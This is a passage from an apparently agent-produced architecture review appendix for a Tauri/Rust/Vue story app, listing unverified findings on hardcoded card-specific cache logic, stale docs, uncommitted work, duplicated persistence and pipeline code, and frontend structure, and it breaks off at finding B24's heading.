
## 附录 B：未逐条对抗核实的重要发现（39 条）

> 以下发现由维度分析 agent 产出并附证据引用，但**未经独立对抗核实**。引用前先复核证据。

### B1. [高 / 产品意图符合度与范围纪律] Per-card runtime knowledge compiled into generic host code with no documented boundary for the next card

**证据**：crates/tauri-app/src/card_shell_cache.rs:20-22 (DESTINY_STANDARD_MAP_URL/DESTINY_ULTRA_MAP_URL/ULTRA_MAP_FALLBACK_MESSAGE constants), :219-227 (cached_optional_map_fallback keyed on the exact ultra-map URL), :434-436 (should_fetch_by_ranges pinned to host i.ibb.co); frontend/src/utils/cardShellFetchProxy.js:69-80 (createCardShellMapReadyFallbackScript targeting '[data-page="map"]' for "older Destiny status builds"); frontend/src/utils/cardShellOpeningChat.js:1-8 (doc comment: builds "the ST-compatible first chat message the Destiny home shell expects", emulating chat[0].swipe_id/swipes + saveChat/reloadCurrentChat). docs/workstreams/CAMPAIGN-WORLDINFO-AND-CARD-SHELL-PLAN.md documents non-goals (no 99 events, no plugin market) but contains no policy for how a second gold card is onboarded.

**问题**：INTENT.md and CARD-STUDIO-FEASIBILITY both state ST cards are import material, not the product form ("不把 ST 运行时当产品形态"). Hardcoding one card's third-party image-CDN URLs, its host-specific fetch quirk, its stale-loading-state DOM repair, and its opening-chat seed shape into compiled Rust and generic JS utilities makes the product binary card-shaped. Each item is individually small, commented, and test-covered — but the accumulation pattern (35 shell commits in two days, each fixing one card behavior) is exactly the incremental path to a second SillyTavern the docs warn against. Failure modes: the card author updates v4.1→v4.2 and the i.ibb.co URLs change, silently disabling the fallback; card #2 arrives and, absent a stated rule, gets its own constants in card_shell_cache.rs; the boundary question ("is this a compat layer or a runtime?") gets re-litigated per commit instead of per policy.

**建议**：Move card-specific data out of compiled code into the existing per-card shell manifest (the extractor already produces inventory JSON): map fallback pairs, range-fetch host hints, and DOM-repair selectors become manifest fields; card_shell_cache.rs keeps only the generic mechanisms (allowlist, cache, range fetch, sibling fallback). Then add one paragraph to CAMPAIGN-WORLDINFO-AND-CARD-SHELL-PLAN.md stating the card-#2 rule: new cards may only be supported via manifest data + the existing plugin-bridge surface; any Rust/host change for a specific card requires a plan entry justifying it.

### B2. [高 / 工程健康与规模上限] Designated authority doc DOCS-CODE-AUDIT.md is factually wrong (14 crates/110 commands vs real 16/142) and 18 days stale

**证据**：docs/DOCS-CODE-AUDIT.md:34-36 states 'Cargo.toml 当前 workspace members 为 14 个 crate', '110 个 #[tauri::command]', and 'README 中"14 个 crate"...与当前代码一致'. Reality: Cargo.toml [workspace] members = 16 crates (verified via cargo metadata = 16 packages); grep -c '#[tauri::command]' crates/tauri-app/src/lib.rs = 142; README.md:26 already says '16 个 crate', so the audit's cross-reference claim is doubly false. Audit status line: 2026-07-06 (+2026-07-08 增量); today is 2026-07-26. docs/ARCHITECTURE-AUDIT.md (required reading #3 per CLAUDE.md) is dated 2026-06-17 and predates infra-sqlite, infra-regex, card-shell, and the plugin host entirely. docs/workstreams/CAMPAIGN-WORLDINFO-AND-CARD-SHELL-PLAN.md:4 pins '当前 HEAD 相关提交：8e97af8' but git log shows 6 more commits landed after it (f22c5fa..d36d433, all 2026-07-23) plus a 23-file uncommitted WIP.

**问题**：CLAUDE.md commands 'Treat docs/DOCS-CODE-AUDIT.md as the authority for separating current code facts from future plans' and mandates it first in the required reading order. This project is developed by AI agents that literally execute on these facts (the repo's own codemod scripts and .worktrees agent checkouts prove the workflow). A wrong authority document is worse than no document: an agent following the mandated process will trust '14 crates / 110 commands' and the stale card-shell plan state over the code, producing exactly the mis-scoped edits the doc system exists to prevent. The two-week gap coincides with the highest-velocity workstream (8+ card-shell commits in one day), i.e., the sync discipline broke precisely when it mattered most.

**建议**：Do one sync pass of DOCS-CODE-AUDIT.md, ARCHITECTURE-AUDIT.md, and the card-shell plan header now. Then remove volatile counts (crate count, command count, pinned SHAs) from prose entirely, or add a cheap check to scripts/verify-release.ps1 that greps the claimed counts against `cargo metadata` and `grep -c '#[tauri::command]'` and fails on mismatch — the release gate already runs six steps; a seventh 1-second step makes doc drift impossible to ship.

### B3. [高 / 工程健康与规模上限] Card-specific Destiny hardcode in generic shell-cache infra permanently serves the wrong resource while claiming it's temporary

**证据**：crates/tauri-app/src/card_shell_cache.rs:20-22 hardcodes DESTINY_STANDARD_MAP_URL / DESTINY_ULTRA_MAP_URL (i.ibb.co URLs of one specific third-party card) and ULTRA_MAP_FALLBACK_MESSAGE '超清地图源响应过慢，已暂时显示高清地图。'; :219-227 cached_optional_map_fallback returns the standard map whenever the ultra map URL is requested and the standard map is cached; :236 this fallback is checked BEFORE the requested URL's own cache lookup at :239, so once Maplite.webp is cached, Map.webp can never be served again — not even from its own valid cache entry; :435 should_fetch_by_ranges special-cases host i.ibb.co. The file's own header (:1-4) states the design rule: 'Complete path (no degradation)'.

**问题**：This violates the project's stated card-shell hard constraint (no fake/degraded shell) in the very file that documents it. The degradation is permanent, not temporary as the user-facing message claims: the short-circuit at :236 precedes the ultra map's own cache check, so a previously-downloaded 31MiB ultra map on disk is unreachable forever. It also embeds one card's content knowledge into the generic host mediation layer, which does not scale past card #1 — every future slow card asset would need another pair of hardcoded consts and another bespoke fallback function.

**建议**：Replace with a generic mechanism: check the requested URL's own cache first (move :239 above :236), and implement fallback as policy (per-request timeout + explicit user-retriable state surfaced through ShellFetchResult) or as card-declared metadata ('if X stalls, use Y'), not as compiled-in constants. At minimum, make the fallback expire so a background retry can eventually populate the real resource.

### B4. [高 / 工程健康与规模上限] 3-day-old uncommitted WIP where tracked files import untracked modules — any partial commit ships a broken build, and days of work sit unprotected

**证据**：git status: 13 tracked-modified files (crates/tauri-app/src/lib.rs, card_shell_cache.rs, frontend/src/AppV2.vue, CardShellHost.vue, ...) alongside 10 untracked source/test files. frontend/src/AppV2.vue:102-104 imports './utils/cardShellOpeningChat.js' (untracked); frontend/src/components/CardShellHost.vue:66-75 imports '../utils/cardShellFetchProxy.js' and '../utils/cardShellVariableStore.js' (both untracked). Last commit d36d433 is 2026-07-23; today is 2026-07-26 — three days of work exists only in the working tree on branch main, with a second diverged worktree (.worktrees/feat-card-studio-phase1 at a6fc41b) in flight simultaneously.

**问题**：Two concrete failure modes: (1) `git commit -am` or any commit that stages only modified files produces a main branch that does not build — AppV2.vue and CardShellHost.vue reference modules git doesn't have; (2) a stray `git checkout -- .`, disk failure, or agent mishap destroys three days of unversioned work including 6 new util/test files. For a solo project with agents concurrently editing the same lib.rs from a worktree, this is the single most likely near-term data-loss event.

**建议**：Commit the card-shell workstream atomically today (one or more complete commits including the new utils/tests), even as WIP-labeled commits on a feature branch. Adopt `git add -A && git status` before every commit as habit, and never let cross-file WIP (tracked importing untracked) survive a session boundary.

### B5. [中 / 后端分层与依赖] Postprocess persistence policy is implemented in parallel for store-backed and runtime paths, risking JSON/SQLite semantic divergence

**证据**：Three write paths dispatched in run_shared_postprocess_background (lib.rs:3004-3065): (1) non-Campaign legacy → persist_postprocess_outcome_to_store (lib.rs:4684-4810, direct store writes via normalize_knowledge_update_for_postprocess lib.rs:4835); (2) Campaign+JSON → build_json_mutation_batch (production_postprocess.rs:897, reuses the same crate::normalize_knowledge_update_for_postprocess at line 950); (3) Campaign+SQLite → build_runtime_mutation_batch (production_postprocess.rs:1041-1200+), which independently re-implements name-collision detection, instance resolution, broadcast targeting, PropagationPolicy blocking, and presence exemptions against CampaignRuntimeContext.

**问题**：The project's own requirement is that agent outputs are validated and name references normalized to instance ids before persistence. That policy now exists in two independent codings (store-backed vs runtime-snapshot-backed). Any future rule change — a new PropagationPolicy variant, a change to presence exemptions or same-name handling — must be made in both, and a missed edit silently writes different knowledge/variable data depending on which storage backend the user selected. Tests guard current behavior but nothing structurally forces the two implementations to agree.

**建议**：Make CampaignRuntimeContext the single policy substrate: have the JSON path assemble a runtime snapshot (fill_campaign_runtime_from_store already exists, lib.rs:4281) and route all three paths through build_runtime_mutation_batch, keeping backend differences confined to how the resulting MutationBatch is applied. Delete the store-backed normalize path once parity tests pass.

### B6. [中 / 后端分层与依赖] Meta typed-patch preview and apply are dual implementations that must be kept consistent by hand

**证据**：apply_typed_action (lib.rs:8680-8862) applies TypedPatchAction directly to CampaignStore, with an in-code warning at lib.rs:8703-8705 that it must match app-meta's pure apply_to_snapshot function ('否则 accept 前的纯函数预演（显示 schema 默认值）与真正写盘（写 null）结果不一致'). Preview runs the app-meta pure function (meta_preview_typed_patch_in_store lib.rs:8346); accept runs the lib.rs store-backed version. SQLite mode rejects typed patches entirely via meta_backend::ensure_typed_patch_backend_supported (lib.rs:8408).

**问题**：The Meta layer's contract is explain-then-repair: the user accepts exactly what the preview showed. Because preview (pure, app-meta) and apply (store-backed, tauri-app) are separate codings of the same action semantics, any drift means the accepted repair differs from the previewed one — the comment documents a bug of exactly this class already having been fixed. The SQLite feature gap also grows the per-backend feature matrix.

**建议**：Invert the apply path: compute the post-state via the app-meta pure apply_to_snapshot on a snapshot, then persist the diff, so preview and apply share one implementation. This also gives SQLite typed-patch support for free via the MutationBatch path instead of a fail-closed rejection.

### B7. [中 / 后端分层与依赖] Dual state model: Tauri-managed AppState coexists with eight process-global OnceLock store singletons

**证据**：lib.rs:102-186 ('全局存储（保留 M0 兼容）'): STORE, CONN_STORE, PRESET_STORE, GLOBAL_REGEX_STORE, CAMPAIGN_STORE, COMPRESS_JOB_STORE, TURN_STORE plus the card-shell CACHE OnceLock (lib.rs:148-152), all keyed off get_app_data_dir() (lib.rs:320). AppState (lib.rs:555) separately owns conv_store/log_store/vector_store/module stores with its own data_dir field; AppState::new_with_data_dir constructs a second ConnectionStore at lib.rs:679 while get_conn_store() holds a global one. get_campaign_store() needs a defensive per-call disable_json_access guard (lib.rs:154-170) because global init order versus sqlite activation cannot be enforced.

**问题**：Half the stores are dependency-injected via Tauri manage(), half are ambient globals. Commands using globals are pinned to the real APPDATA directory and cannot be tested in isolation (AppState::new_for_test at lib.rs:747-754 redirects only the AppState half), the same store type is instantiated twice over the same files (ConnectionStore), and correctness of the SQLite fail-closed rule depends on a re-checked runtime guard rather than construction order.

**建议**：Fold the OnceLock singletons into AppState (they are all constructed from the same data_dir), so backend resolution happens once in run() before AppState::new and every command reaches stores via state. This removes the disable_json_access re-guard and makes command-level tests possible against temp dirs.

### B8. [中 / 后端分层与依赖] Storage backend dispatch is branched at ~65 is_sqlite_active() call sites instead of behind a port

**证据**：grep 'is_sqlite_active' in crates/tauri-app/src/lib.rs returns 65 hits (e.g. get_active_turn_for_backend lib.rs:190-198, get_turn_by_variant_for_backend lib.rs:200-208, AppState::new_with_data_dir lib.rs:622, run_shared_postprocess_background lib.rs:3050), plus further branches in turn_lifecycle.rs and production_postprocess.rs.

**问题**：Every new command or helper that touches persistence must remember to add the branch; a forgotten branch silently reads/writes the wrong backend (the codebase already needed the disabled-JSON poison guard to catch exactly this). It is also why per-backend feature gaps accumulate (Meta typed patch unsupported under SQLite) — there is no single seam where backend capability is declared.

**建议**：Introduce one backend facade (trait or enum-dispatched struct chosen at startup) covering the turn/campaign/conversation read-write operations that currently branch inline, so is_sqlite_active() is consulted in exactly one place. The existing *_for_backend helpers are the natural seed for this facade.

### B9. [中 / 后端分层与依赖] Single-card (Destiny) URLs and fallback behavior hardcoded into the card-agnostic shell cache, permanently shadowing one resource

**证据**：card_shell_cache.rs:20-22 (DESTINY_STANDARD_MAP_URL / DESTINY_ULTRA_MAP_URL / ULTRA_MAP_FALLBACK_MESSAGE consts), 82-84 (max_bytes ceiling justified by this card's 31.5MiB map), 219-227 (cached_optional_map_fallback), 235-241 (fallback checked BEFORE read_cache(url) in fetch_blocking_with_client), 434-436 (should_fetch_by_ranges special-cases host i.ibb.co).

**问题**：The host cache is the platform's generic, security-relevant mediation layer, but it now contains per-card product logic. Worse, the fallback ordering means that once the standard map is cached (which always happens, since the card opens it first), a request for the ultra map returns the standard map's bytes forever — the ultra map can never be fetched or served again, while ShellFetchResult.url still claims the ultra URL and the user message says the downgrade is temporary ('已暂时显示高清地图'). That is a permanent, mislabeled content substitution inside the layer whose stated constraint is 'no fake/degraded shell', and every future problematic card will invite another hardcoded special case here.

**建议**：Move per-card resource policy out of CardShellCache into data: a per-card manifest entry (alternate_of / optional-resource mapping, preferred fetch strategy) consumed generically. At minimum, only serve the fallback when the requested URL misses both cache and network (try read_cache(url) first, then network with a short budget, then fallback), and label the result with the actual served URL.

### B10. [中 / 后端分层与依赖] DOCS-CODE-AUDIT.md, the project's designated code-facts authority, asserts stale facts as verified-current

**证据**：docs/DOCS-CODE-AUDIT.md:34-36 states the workspace has 14 crates and lib.rs has 110 #[tauri::command] commands and explicitly claims '与当前代码一致' (consistent with current code). Actual: 16 crates (crates/ listing includes infra-regex, infra-sqlite beyond the 14) and 142 commands (grep count in lib.rs). CLAUDE.md instructs treating this file as 'the authority for separating current code facts from future plans'.

**问题**：The project's own process rule routes every contributor (and every agent session) through this document first. When the authority document confidently asserts false counts, its other 'current code facts' lose trust, and the discipline it exists to enforce — distinguishing implemented reality from plans — silently degrades.

**建议**：Update the counts and audit the file's other assertions against HEAD; add a one-line verification command next to each countable claim (e.g. the grep used) so staleness is mechanically checkable at review time.

### B11. [中 / 数据模型与状态一致性] SQLite backend does not enforce knowledge→instance / task→instance referential integrity that the JSON path guarantees

**证据**：JSON preflight requires knowledge.character_id, knowledge.source_character_id, and task.related_characters to resolve to existing CharacterInstances (crates/tauri-app/src/turn_coordinator.rs:149-165, 196-205). The SQLite equivalent `apply_mutation` in crates/infra-sqlite/src/production.rs:742-763 (UpsertKnowledge) and 780-790 (UpsertNewTask) checks only campaign scope. The schema has no FK to instances: crates/infra-sqlite/migrations/V001__init_schema.sql:41-45 gives character_knowledge a FK to campaigns only; character_id lives inside payload_json.

**问题**：The project's own rule is "agent outputs must be structurally validated before persistence; name references normalized to instance ids". Under the opt-in SQLite backend, a MutationBatch carrying a knowledge entry bound to a nonexistent/hallucinated instance id commits successfully, creating dangling references that the JSON path would have rejected with MutationConflict. Meta health checks (meta_backend.rs) would later report the inconsistency, but the invariant is supposed to hold at write time.

**建议**：Add the instance-existence checks to production.rs `apply_mutation` (a `SELECT 1 FROM character_instances WHERE instance_id=? AND campaign_id=?` inside the transaction), and/or promote character_id to a structured column with a real FK in the next migration.

### B12. [中 / 数据模型与状态一致性] SQLite authority covers only a subset of Campaign state; the rest fails closed with misleading errors or silent empties

**证据**：No world_info or MVU tables exist in infra-sqlite (grep across crates/infra-sqlite/src returns nothing; CutoverReport fields in cutover.rs:150-163 count only cards/campaigns/instances/knowledge/tasks/summaries/conversations/turns). Under SQLite: world info commands reject explicitly (lib.rs:10664-10668), campaign deletion rejects (lib.rs:6260-6264), Meta typed patch rejects (meta_backend.rs:67-85) — but `set_campaign_variable` / `get_campaign_variables` / `set_character_variable` (lib.rs:10042-10105) hit the disabled JSON sentinel unconditionally, whose reads return None/empty (campaign_store.rs:172-177, 339-349), so they fail as "找不到 campaign" (not-found) rather than "unsupported under SQLite". The disabled store's list_* methods silently return empty Vecs (campaign_store.rs:316-337) while writes error, an asymmetry any unconverted read path can silently absorb.

**问题**：The fail-closed principle is honored in spirit, but the SQLite backend is authoritative over an incomplete slice of Campaign state: per-campaign worldbooks (which the current card-shell workstream depends on), MVU translations, campaign variables (including the new card-shell variable bag), and deletion are all unavailable. Anyone enabling STORYFORGE_STORAGE_BACKEND=sqlite gets a半功能 app with error messages that misdiagnose the cause ("campaign not found" when the campaign exists in SQLite). The silent-empty read behavior of the disabled sentinel means a future code path that forgets its `is_sqlite_active` branch reads an empty world instead of crashing — the exact drift the sentinel was meant to prevent.

**建议**：Make the disabled sentinel's reads return errors (or panic in debug) instead of empty data, matching its write behavior. Route the remaining variable read/write commands through sqlite_runtime or reject them with an explicit "unsupported under SQLite" message. Track the coverage gap (world info, MVU, variables, delete) as an explicit checklist gating any promotion of SQLite beyond opt-in.

### B13. [中 / 数据模型与状态一致性] Card-shell variable bag bypasses the entire consistency machinery: unlocked read-modify-write on a whole-Campaign JSON blob, serialized only by a frontend promise queue

**证据**：frontend/src/utils/cardShellVariableStore.js:2 stores all ST selector buckets (message/character/chat/global/script/preset) as one JSON object under Campaign variable `__storyforge_card_shell_variables`; writes are serialized only by a module-level Map of promise tails (lines 90-103, comment: "Visible opening/status shells are separate iframe hosts"). CardShellHost.vue:236-252 does read (`getCampaignVariables`) → merge → write (`setCampaignVariable`) across two IPC calls. The backing command `set_campaign_variable` (lib.rs:10088-10105) performs get_campaign → set_variable → update_campaign with no `with_campaign_lock`, no revision bump, and only a check-then-act `reject_if_active_turn` at entry (lib.rs:272-295).

**问题**：Every persisted write replaces the entire blob, so the last writer wins at two levels: (1) the Rust command is an unlocked RMW on the whole Campaign row — any concurrent campaign-variable writer outside the one JS module (a second window, the MVU webview runtime, a future background job) can erase another writer's selector bucket or another variable key entirely; (2) `reject_if_active_turn` is a TOCTOU check — a turn created between the check and the write lets shell state land mid-turn without bumping revision, silently violating the frozen-context invariant that the revision CAS otherwise protects. Since ST card scripts use these variables as story-visible state, this is a second, unversioned source of truth for narrative state sitting next to the carefully versioned one.

**建议**：Move the merge into Rust: a `merge_campaign_variable(campaign_id, key, patch)` command that performs the read-modify-write inside `with_campaign_lock` (and re-checks the active-turn barrier inside the lock). Keep the frontend queue only as latency optimization, not as the correctness mechanism.

### B14. [中 / 数据模型与状态一致性] story_clock dual representation can silently disagree between readers

**证据**：crates/domain/src/campaign.rs:141-162 — `set_variable` mirrors the value into the legacy `story_clock` field only when it is a JSON string (`clock_update` is None otherwise); `current_story_clock()` (131-139) reads the variables entry via `.and_then(|v| v.value.as_str())` and falls back to the legacy field when the value is non-string. Agents write variables through `Mutation::SetVariable` with arbitrary `serde_json::Value` (turn_coordinator.rs:331-354) — nothing constrains story_clock to a string. SQLite additionally persists `current_story_clock()` into a structured column while payload_json keeps the raw legacy field (production.rs:876-899).

**问题**：If a postprocess batch ever sets story_clock to a number or object (LLM-derived output; only structural validation is applied), `get_variable("story_clock")` and the UI show the new value while `current_story_clock()` — used to assemble prompt context — silently returns the stale legacy field. The two readers then permanently disagree with no error and no revision anomaly, which is precisely the drift class the deprecated-field comment (campaign.rs:28-31) acknowledges but defers.

**建议**：Validate/coerce story_clock to a string at the mutation boundary (preflight already inspects each mutation), or complete the deferred migration: drop the legacy field behind a serde alias and make variables the sole representation.

### B15. [中 / 数据模型与状态一致性] Delete cascades are non-transactional and never touch the Turn journal; a deleted campaign's Committing turn is retried at every startup forever

**证据**：campaign_store.rs:423-448 `delete_campaign` mutates campaigns/instances/knowledge/tasks/summaries in memory then persists each file sequentially with `?` early-return — a mid-sequence persist failure leaves a partial cascade on disk and in-memory caches ahead of disk (same pattern in `delete_card`, 266-312). The command wrapper `delete_campaign_playthrough_in_store` (lib.rs:6275-6334) deletes campaign then conversations but never removes TurnRecords, and the `delete_campaign` command (lib.rs:6256-6272) has no `reject_if_active_turn` barrier. Startup recovery keeps CampaignNotFound turns Committing indefinitely (turn_lifecycle.rs:690-695: "保持 Committing").

**问题**：Deleting a campaign mid-turn (allowed — no barrier) or after a crash-in-commit leaves an orphaned active/Committing TurnRecord in turns.json that `list_recoverable_turns` replays on every startup and re-fails with CampaignNotFound forever — permanent recovery noise and unbounded journal growth. A partial cascade failure additionally leaves orphaned knowledge/tasks/summaries rows with dangling campaign_id that no code path ever reaps (they are filtered out of queries but accumulate).

**建议**：Add `reject_if_active_turn` to campaign deletion; cascade TurnStore records (mark terminal `Failed("campaign deleted")` or remove) in the same operation; make recovery abandon CampaignNotFound turns after confirming the campaign is absent from the store rather than keeping them recoverable forever. For the multi-file cascade, adopt the clone-mutate-persist-swap pattern already used in `update_campaign`/`create_campaign_with_instances` per collection, or at minimum persist in a dependency-safe order (children before parent).

### B16. [中 / 多 Agent 流水线与运行时] Three near-duplicate tool loops (~420 lines, ~75% identical) in runtime.rs are an active maintenance hazard

**证据**：crates/app-agent/src/runtime.rs: run_tool_loop (282-408, 127 lines), run_tool_loop_streaming (420-556, 137 lines), run_tool_loop_with_layout (573-730, 158 lines). After normalizing log tags, streaming-vs-layout differ by ~49 lines and plain-vs-streaming by ~70 (measured by diff) — the drift-recovery, empty-response, terminal-tool, and reasoning-capture logic exists three times. The cost is already visible: the terminal-tool recovery fix required three near-identical regression tests (runtime.rs:1317-1405), and run_tool_loop contains a dead branch — line 344 `if req.tools.is_none()` is unreachable because the enclosing branch (line 339-341) requires !tool_registry.tool_specs().is_empty(), which forces req.tools = Some.

**问题**：Any change to loop policy (drift-recovery wording, terminal-tool semantics, reasoning budgets, cancellation points) must be applied three times and verified three times; the dead branch shows the copies have already diverged semantically once. The only real deltas are (a) initial messages come from [system,user] vs layout.into_messages(), (b) chat vs chat_stream, (c) completion_probe support, (d) round-1 fingerprint logging — all parameterizable.

**建议**：Collapse to one loop: take initial Vec<ChatMessage> (callers build it from config or layout), always call chat_stream with an optional progress sink (a no-op sink reproduces run_tool_loop; mock clients already implement chat_stream), and make completion_probe/fingerprint-check optional parameters. Delete the dead req.tools.is_none() branch regardless.

### B17. [中 / 多 Agent 流水线与运行时] start_writing and regenerate duplicate the director+subagent stage and the editor stage; event emission has already drifted between paths

**证据**：crates/app-pipeline/src/lib.rs: director+subagent block in start_writing (761-993) is repeated nearly line-for-line in regenerate path A (1440-1672), including chronicle partitioning, temp-instance creation, and failure collection. The editor stage exists twice: inline in start_writing (1002-1150) and in run_editor_and_commit (2010-2157). Observable drift: regenerate paths B and C emit StateChanged(Editing)+EditorStarted (1720-1724, 1948-1952) and then run_editor_and_commit emits EditorStarted AGAIN (2016-2017) — double EditorStarted; while path A never emits StateChanged(Editing) at all (run_editor_and_commit sets self.state but sends no StateChanged), so the frontend sees the Editing state transition on start_writing but not on full regenerate.

**问题**：This is the concrete answer to "how hard is adding a pipeline stage": a new stage (or a change to event ordering, temp-instance handling, or history assembly) must be hand-synchronized across two 200+-line scripts plus run_editor_and_commit, and the event contract is already inconsistent, which any frontend state machine keyed on StateChanged/EditorStarted will experience as path-dependent behavior.

**建议**：Extract the director+subagent stage into a private run_director_and_subagents(...) used by both entry points (the inputs are already identical: config, layout inputs, char_specs, spawn args), and make start_writing call run_editor_and_commit instead of its inline copy. Normalize event emission inside the shared helpers (emit StateChanged exactly once per state, EditorStarted exactly once).

### B18. [中 / 多 Agent 流水线与运行时] MessageLayout stable-prefix discipline and PromptHook plugin semantics are convention-only with silent degradation

**证据**：Enforcement of the §22/D46 cache layout is a round-1-only info log comparing pre/post-hook segment hashes (runtime.rs:606-620); rounds 2+ are not even logged. The single PromptHook seam applies to every role and round, and the frontend hook implementation falls back to the ORIGINAL messages on an 8s timeout or channel error with only tracing::warn (tauri-app/src/lib.rs:2296-2314) — the plugin's transformations are silently dropped from that request.

**问题**：Two failure modes: (1) a plugin that rewrites system/history on every round silently destroys KV-cache reuse — cost, not correctness, but it is the layer the whole §22 design exists for, and there is no metric or clamp; (2) for card-shell/ST-preset prompt injection, a slow or crashed plugin means the LLM is called with un-transformed prompts while the user believes the preset is active — the same class of silent degradation the card-shell workstream's "no fake/degraded shell" constraint forbids. As the ONLY runtime extension seam, PromptHook concentrates both risks.

**建议**：Log (or count via the existing SegmentFingerprint) prefix mutations on every round, not just round 1. For the frontend hook, make the timeout fallback visible: emit a PipelineEvent (e.g. PromptHookDegraded) so the UI can surface that a plugin transformation was skipped; consider a per-plugin flag for "required" hooks that should fail the round instead of silently proceeding.

### B19. [中 / 多 Agent 流水线与运行时] Lenient Plan parsing accepts degenerate plans: 'unknown' characters become persisted instances and zero-task plans bypass the failure guard

**证据**：parse_plan_json (app-pipeline/lib.rs:3004-3090) requires only scene_brief OR subagent_tasks (3005-3012), defaults character_id to "unknown" (3026-3030) and brief to "". In Campaign mode an unmatched "unknown" id flows into with_temporaries_for (lib.rs:906-916), creating a temporary CharacterInstance that rides the TurnAttempt and is persisted at accept. A plan with scene_brief but zero tasks skips the all-subagents-failed abort (986: `performances.is_empty() && !plan.subagent_tasks.is_empty()`) and proceeds to the editor with an empty performances list. The completion probe (835-853) accepts any content substring that parses as such a plan via the layer-5 brace matcher, early-terminating the director loop.

**问题**：The 5-layer extraction itself is sound engineering for uncontrollable model output, but the leniency of the domain-level parse behind it converts malformed director output into silent degenerate behavior instead of a re-prompt: junk "unknown" instances persisted into the Campaign (violating "agent outputs must be structurally validated before persistence; names normalized to instance ids"), and editor-only drafts with no character performances that mask director quality failures. The probe can also latch onto a plan-like fragment embedded in conversational text and terminate with a task-less plan.

**建议**：Tighten parse_plan_json: reject tasks with missing/empty character_id (drop the "unknown" default) and treat a zero-task plan as a parse failure unless explicitly allowed; in Campaign mode, refuse to create a temporary instance for ids that look like placeholders. Keep the 5-layer extraction as-is — the fix belongs in the domain validation, not the extraction.

### B20. [中 / 前端架构] useNewCampaignForm instantiated twice with asymmetric injections — duplicate state, duplicate fetches, latent divergence

**证据**：frontend/src/AppV2.vue:504-511 creates one instance (injections omit refreshCardShellManifest) used for showNewCampaignForm + openNewCampaignDialog; frontend/src/components-v2/campaign/NewCampaignForm.vue:25-33 creates a second instance from 7 threaded function props (lines 14-20), and its watch on props.show (lines 55-60) calls openNewCampaignDialog again. So every dialog open runs listCards + getCard twice (once into the root instance's dead refs, once into the component's), and only the component instance ever runs handleCreateCampaign.

**问题**：The composable was written as local-state ("仅此表单使用，放 composable 内部，不进 store") but is consumed as if it were a shared store from two owners. The root instance's card/greeting refs are dead state; its handleCreateCampaign — which lacks refreshCardShellManifest — is a trap: anyone wiring it later would create a Campaign whose opening shell shows the previous card's page, the exact bug the injected refresh (useNewCampaignForm.js:120-123) exists to prevent. This is prop drilling recreating the DI graph one level down, with two copies of the graph that have already drifted.

**建议**：Pick one owner. Either instantiate the composable only in AppV2 and pass the returned state/handlers to a dumb NewCampaignForm (props: cards/name/greetings, events: create/close), or promote the form state to a Pinia store / provide-inject so both layers share one instance. Delete the 7 function props.

### B21. [中 / 前端架构] AppV2 composition root is re-accreting business logic — the App.vue monolith pattern is restarting

**证据**：frontend/src/AppV2.vue: card-shell state refs (195-206), arm/disarm watch (216-221), openingShellChatSeed assembly with two-source greeting merge (232-245), layout-suppression provide (250-257), onShellVarWrite scoping heuristic (259-280), 45-line refreshCardShellManifest with card/character fallback resolution (282-326), 46-line onOpeningShellApplied message surgery (397-442), continueActiveCampaignWriting (550-563). None of this is in a composable, and the file's own architecture header (lines 1-39) documenting the composable topology does not mention any of it. File is 806 lines and growing; the deleted App.vue reached 1462 before the rework.

**问题**：The rework's whole premise was that orchestration lives in injected composables and AppV2 stays an assembly manifest. The card-shell workstream is the first feature to bypass that pattern entirely — roughly 250 lines of stateful orchestration inline, including logic with real invariants (opening lifecycle, manifest target resolution, variable scope selection). Each future card-shell change now edits the composition root, which is exactly how the last monolith formed; the stale header comment shows the documentation discipline has already broken.

**建议**：Extract a useCardShellSurfaces({ getCard, getCardShellManifest, ... }) composable following the established DI pattern (it already has natural seams: armed state, manifest refresh, seed builder, var-write sink, opening-applied handler), wire it in the numbered assembly section, and update the header topology comment.

### B22. [中 / 前端架构] CardShellHost extraction stopped halfway — ~330 lines of stringified iframe runtime remain untestable inline

**证据**：frontend/src/components/CardShellHost.vue:384-619 (bridgeLines: ask/postMessage protocol, ES-module graph resolver with regex import rewriting, jQuery $.load/$.getScript patching, opening-chat seeding + reloadCurrentChat hook), 620-693 (preloadLines: CDN loads incl. zod v4 shape probing), 698-715 (resizeReporterLines) — all built as JS string arrays inside the component. Meanwhile the same file imports extracted, tested equivalents for smaller pieces: createCardShellFetchProxyScript, createCardShellMapReadyFallbackScript, createCardShellRuntimeCompatibilityScript (tests/card-shell-*.test.mjs all pass).

**问题**：The riskiest injected code — the module-graph resolver that regex-rewrites import specifiers, and the ST chat seed/reload hook the whole opening handoff depends on — is unlinted, unhighlighted string content that no test executes, in a 968-line component that also handles bridge dispatch (10+ message types), variable persistence, worldbook mediation, and resize. A regression in the escaped-string regexes (e.g. __sfShellImportSpecRe built via String.fromCharCode) would only surface at runtime inside a sandboxed card.

**建议**：Finish the established extraction: move bridgeLines/preloadLines/resizeReporterLines into factory functions in utils/ (mirroring cardShellFetchProxy.js) and add node tests that at minimum eval the generated script in a stub window and exercise the import-rewrite regex against real card module samples. CardShellHost then shrinks to lifecycle + bridge dispatch.

### B23. [中 / 前端架构] Shell runtime depends on live third-party CDNs at first load, against Android-first and no-degraded-shell goals

**证据**：frontend/src/components/CardShellHost.vue:631-677: jQuery from cdnjs.cloudflare.com, Vue 3.5.13 + ejs 3.1.10 + zod 4.4.3 from cdn.jsdelivr.net (plus testingcf.jsdelivr.net mirror), lodash from cdnjs — fetched at shell load via host mediation; zod validity decided by content sniffing (line 649: zcode.indexOf('prefault') < 0 → 'not zod v4'). Preload failure throws and surfaces as preload_error → shell error state (lines 689-691, 846-848).

**问题**：Host mediation + backend cache satisfies the letter of the constraint, but the first load of any card shell on a device requires four CDN round-trips to succeed; on a Chinese Android network (the stated primary target — the mirror fallback shows this is already a known problem) a blocked CDN yields exactly the hard-failed shell the project forbids. Version pins and library-identity heuristics living inside a string in a component are also unauditable by dependency tooling.

**建议**：Vendor the five pinned libraries as local app assets and serve them through the existing host-fetch path (or the storyforge-cache:// protocol), keeping CDN as last-resort fallback. Move the URL/version table into a plain JS constant next to the other cardShell utils.

### B24. [中 / 前端架构] Deep watch on openingChatSeed forces full iframe reloads that destroy in-shell setup state

